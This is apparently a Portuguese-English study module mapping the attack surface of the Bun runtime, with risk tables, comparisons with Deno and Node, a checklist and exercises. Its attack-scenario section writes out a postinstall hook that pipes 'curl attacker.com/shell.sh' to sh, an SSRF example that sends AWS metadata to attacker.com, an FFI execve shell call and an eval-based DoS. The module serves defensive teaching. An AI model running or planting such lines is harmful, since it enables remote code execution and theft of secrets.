# Attack Surface — Entry Points & Trust Boundaries

> Mapeamento completo de superficies de ataque do Bun runtime.

---

## Intuition (Feynman)

Imagine o Bun como uma fortaleza. A "attack surface" e a soma de todas as portas, janelas, e tuneis que um invasor poderia usar para entrar. Quanto mais features, mais entradas. O trabalho de seguranca e: (1) conhecer todas as entradas, (2) proteger as criticas, (3) fechar as desnecessarias.

No Bun, a fortaleza tem muitas portas abertas — e nenhuma delas tem fechadura.

---

## Trust Boundaries

```
┌─────────────────────────────────────────────────────────────────────┐
│                        UNTRUSTED WORLD                              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐                  │
│  │ npm packages │  │ User input  │  │ Network     │                  │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘                  │
└─────────┼────────────────┼────────────────┼─────────────────────────┘
          │                │                │
          ▼                ▼                ▼
┌─────────────────────────────────────────────────────────────────────┐
│                         BUN PROCESS                                 │
│  ┌─────────────────────────────────────────────────────────────┐    │
│  │                     JSC Engine                               │    │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐         │    │
│  │  │ Parser  │  │ JIT     │  │ GC      │  │ Builtins│         │    │
│  │  └────┬────┘  └────┬────┘  └────┬────┘  └────┬────┘         │    │
│  └───────┼────────────┼────────────┼────────────┼──────────────┘    │
│          │            │            │            │                   │
│  ┌───────┴────────────┴────────────┴────────────┴──────────────┐    │
│  │                     Zig Runtime                              │    │
│  │  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐         │    │
│  │  │ FFI     │  │ HTTP    │  │ FS      │  │ Process │         │    │
│  │  └────┬────┘  └────┬────┘  └────┬────┘  └────┬────┘         │    │
│  └───────┼────────────┼────────────┼────────────┼──────────────┘    │
│          │            │            │            │                   │
└──────────┼────────────┼────────────┼────────────┼───────────────────┘
           │            │            │            │
           ▼            ▼            ▼            ▼
┌─────────────────────────────────────────────────────────────────────┐
│                      OPERATING SYSTEM                               │
│  ┌─────────┐  ┌─────────┐  ┌─────────┐  ┌─────────┐                 │
│  │ Memory  │  │ Network │  │ Files   │  │ Devices │                 │
│  └─────────┘  └─────────┘  └─────────┘  └─────────┘                 │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Attack Surface Categories

### 1. Parser (ALTO RISCO)

**Entry:** Qualquer codigo JavaScript/TypeScript

| Input | Attack | Impact |
|-------|--------|--------|
| Malformed JS | Parser crash | DoS |
| Deep nesting | Stack overflow | DoS/RCE |
| Unicode edge cases | Parser confusion | Code injection |
| RegExp | ReDoS | DoS |
| eval/Function | Code injection | RCE |

**Mitigations:** Fuzz testing, depth limits, timeout

### 2. FFI (CRITICO)

**Entry:** bun:ffi, native addons

| Input | Attack | Impact |
|-------|--------|--------|
| Malicious .so | Code execution | Full system |
| Arbitrary dlopen | Library injection | RCE |
| Memory operations | Memory corruption | RCE |
| Direct syscalls | Kernel access | Full system |

**Mitigations:** NONE in Bun. External sandbox required.

### 3. Package Manager (CRITICO)

**Entry:** bun install, package.json

| Input | Attack | Impact |
|-------|--------|--------|
| Typosquatting | Run malicious package | RCE |
| postinstall scripts | Arbitrary commands | RCE |
| Dependency confusion | Supply chain | RCE |
| Registry compromise | Mass infection | RCE |

**Mitigations:** `--ignore-scripts`, lockfile auditing

### 4. HTTP Parser (MEDIO)

**Entry:** Incoming HTTP requests

| Input | Attack | Impact |
|-------|--------|--------|
| Malformed headers | Parser bypass | Smuggling |
| CRLF injection | Header injection | Various |
| Huge headers | Memory exhaustion | DoS |
| Chunked encoding | Off-by-one | Corruption |

**Mitigations:** uWebSockets.js hardening, limits

### 5. File System (MEDIO)

**Entry:** File operations

| Input | Attack | Impact |
|-------|--------|--------|
| Path traversal | Read/write outside | Info leak/RCE |
| Symlink following | Escape restrictions | Escalation |
| Race conditions | TOCTOU | Various |

**Mitigations:** Path normalization, no symlink

### 6. Network (MEDIO)

**Entry:** fetch, WebSocket, Bun.connect

| Input | Attack | Impact |
|-------|--------|--------|
| SSRF | Access internal services | Network pivot |
| DNS rebinding | Bypass restrictions | Various |
| TLS stripping | MITM | Data leak |

**Mitigations:** URL validation, TLS enforcement

### 7. JSC JIT (ALTO)

**Entry:** Hot code paths

| Input | Attack | Impact |
|-------|--------|--------|
| Type confusion | Memory corruption | RCE |
| JIT spraying | Code injection | RCE |
| Deoptimization bugs | Memory corruption | RCE |

**Mitigations:** JSC built-in hardening, CFI

---

## Risk Matrix

| Surface | Severity | Exploitability | Business Impact |
|---------|----------|----------------|-----------------|
| FFI | Critical | High | Full compromise |
| Install scripts | Critical | High | Supply chain |
| JSC JIT | Critical | Medium | RCE |
| Parser | High | Medium | DoS/RCE |
| HTTP | Medium | Medium | Smuggling |
| FileSystem | Medium | Low | Escalation |
| Network | Medium | Low | SSRF |

---

## Comparison with Other Runtimes

### Deno Permissions

```bash
# Deno: explicit permissions
deno run --allow-read=/tmp --allow-net=api.example.com script.ts

# Bun: NO EQUIVALENT
bun run script.ts  # Full access
```

### Node.js Experimental

```bash
# Node (experimental)
node --experimental-permission \
     --allow-fs-read=/tmp \
     script.js

# Bun: NO EQUIVALENT
```

### Browser

```
Browser: Origin-based, sandboxed, no FS/network without permission
Bun: NONE of these protections
```

---

## Attack Scenarios

### Scenario 1: Malicious npm Package

```json
// package.json of "lodash-utils" (typosquatting)
{
  "name": "lodash-utils",
  "scripts": {
    "postinstall": "node -e \"require('child_process').exec('curl attacker.com/shell.sh | sh')\""
  }
}
```

```bash
# Victim
bun add lodash-utils  # Installs and runs postinstall
# Attacker has shell
```

### Scenario 2: FFI Exploit

```typescript
// malicious.js (looks innocent)
import { dlopen, FFIType, ptr } from "bun:ffi";

const libc = dlopen("libc.so.6", {
  execve: {
    args: [FFIType.cstring, FFIType.ptr, FFIType.ptr],
    returns: FFIType.i32
  }
});

// Execute reverse shell
const cmd = new TextEncoder().encode("/bin/sh\0");
libc.symbols.execve(ptr(cmd), null, null);
```

### Scenario 3: SSRF via Fetch

```typescript
// User-controlled URL
const url = userInput;  // e.g., "http://169.254.169.254/latest/meta-data/"

const res = await fetch(url);  // Accesses AWS metadata
const secret = await res.text();

// Exfiltrate
await fetch("https://attacker.com", { 
  method: "POST", 
  body: secret 
});
```

### Scenario 4: Parser DoS

```javascript
// Deep nesting attack
const depth = 100000;
const evil = "(".repeat(depth) + "x" + ")".repeat(depth);
eval(evil);  // Stack overflow or hang
```

---

## Security Checklist for Bun Projects

### Must Do

- [ ] Never `bun install` untrusted packages without `--ignore-scripts`
- [ ] Never use `bun:ffi` with untrusted code
- [ ] Never `eval()` or `new Function()` with user input
- [ ] Validate all URLs before `fetch()`
- [ ] Sanitize file paths

### Should Do

- [ ] Run in container with seccomp
- [ ] Use read-only filesystem where possible
- [ ] Limit network access via firewall
- [ ] Audit dependencies regularly
- [ ] Pin dependency versions

### Could Do

- [ ] Use Deno instead for security-critical code
- [ ] Implement capability layer in code
- [ ] Monitor FFI usage

---

## Exercises

### Ex 1.1 — Enumerate Entry Points

```bash
# 1. List all built-in modules
bun --print "Object.keys(require('bun'))"

# 2. Which ones access system resources?
# Hint: file, spawn, serve, connect, ffi, etc.
```

### Ex 1.2 — FFI Audit

```bash
# 1. Search codebase for FFI usage
grep -r "bun:ffi" ./

# 2. What capabilities does each usage need?
```

### Ex 1.3 — Package Audit

```bash
# 1. List all packages with install scripts
jq '.scripts | to_entries | map(select(.key | contains("install")))' \
  ./node_modules/*/package.json 2>/dev/null

# 2. Review what each script does
```

### Ex 1.4 — Attack Simulation

```bash
# In sandbox only!

# 1. Create malicious package
mkdir evil-pkg && cd evil-pkg
cat > package.json << 'EOF'
{
  "name": "evil-pkg",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "echo 'pwned' > /tmp/pwned"
  }
}
EOF

# 2. Install and verify
cd /tmp && mkdir test && cd test
npm link ../evil-pkg  # Simulates install
cat /tmp/pwned  # "pwned"
```

---

## Security Recommendations for Bun Team

1. **Permission Model** — Like Deno, require explicit permissions
2. **FFI Restrictions** — Require flag to enable FFI
3. **Script Sandboxing** — Run install scripts in container
4. **URL Allowlist** — For fetch in sensitive contexts
5. **JIT Hardening** — Continuous fuzzing, CFI enforcement

---

## Checkpoint

[ ] Identificar todas as categorias de attack surface
[ ] Entender por que FFI e o mais critico
[ ] Conhecer mitigacoes (ou falta delas)
[ ] Comparar com Deno/Node
[ ] Saber proteger projetos Bun

---

## Next

→ [`02-sandbox`](../02-sandbox/) — o que Bun NAO tem
